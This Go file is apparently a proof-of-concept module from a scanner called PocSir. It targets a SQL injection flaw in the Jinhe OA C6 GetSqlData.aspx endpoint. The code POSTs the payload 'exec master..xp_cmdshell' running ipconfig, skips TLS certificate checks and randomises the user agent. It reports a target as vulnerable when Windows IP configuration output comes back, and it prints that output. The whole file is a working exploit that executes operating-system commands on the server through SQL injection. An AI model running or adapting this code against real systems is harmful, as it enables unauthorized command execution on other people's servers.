package poc

import (
	"PocSir/config"
	"bytes"
	"crypto/tls"
	"io"
	"net/http"
	"strings"
	"time"
)

func JinHeSql_Exec(target string) {
	pocUrl := target + "/C6/Control/GetSqlData.aspx/.ashx"
	headers := map[string]string{
		"User-Agent":   getRandUa(),
		"Content-Type": "text/plain",
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}
	payload := []byte(`exec master..xp_cmdshell 'ipconfig'`)
	req, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(payload))
	if err != nil {
		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		config.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == http.StatusOK && strings.Contains(string(data), "Windows IP") {
		config.Right.Printf("[+]%s存在金和OA C6-GetSqlData.aspx SQL注入漏洞\n", target)
		config.TextPut.Printf(string(data) + "\n")
	} else {
		config.ErrMsg.Printf("[-]%s不存在存在金和OA C6-GetSqlData.aspx SQL注入漏洞\n", target)
	}

}
